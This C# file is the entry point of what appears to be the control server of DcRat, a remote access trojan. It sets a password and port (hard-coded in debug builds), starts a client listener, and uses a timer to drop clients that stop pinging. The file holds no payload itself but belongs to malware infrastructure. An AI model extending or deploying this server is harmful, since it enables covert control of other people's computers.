using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Server
{
    internal class Program
    {
        public static Timer tim = new(1000);

        private static async Task Main(string[] args)
        {
#if DEBUG
            Settings.Password = "qwqdanchun";
            Settings.Port = 8848;
#else     
            Console.Write("Password:");
            Settings.Password = Console.ReadLine();
            Console.Write("Port:");
            Settings.Port = Convert.ToInt32(Console.ReadLine());
#endif
            Console.WriteLine("Welcome to DcRat  <(￣︶￣)>");
            Settings.clientTasks = Settings.ClientTask.Init();
            Settings.notifyConfig = Settings.NotifyConfig.Init();
            var listener = new Listener();
            await Task.Run(() => listener.Connect());
            tim.Elapsed += Tim_Elapsed;
            tim.Start();
            while (true) Thread.Sleep(1000);
        }

        private static void Tim_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (Settings.Online.Count > 0)
                foreach (var CL in Settings.Online.ToList())
                    if (Helper.DiffSeconds(CL.Info.LastPing, DateTime.Now) > 20)
                        CL.Disconnected();
            if (Settings.Controler.Count > 0)
                foreach (var CL in Settings.Controler.ToList())
                    if (Helper.DiffSeconds(CL.Info.LastPing, DateTime.Now) > 20)
                        CL.Disconnected();
        }
    }
}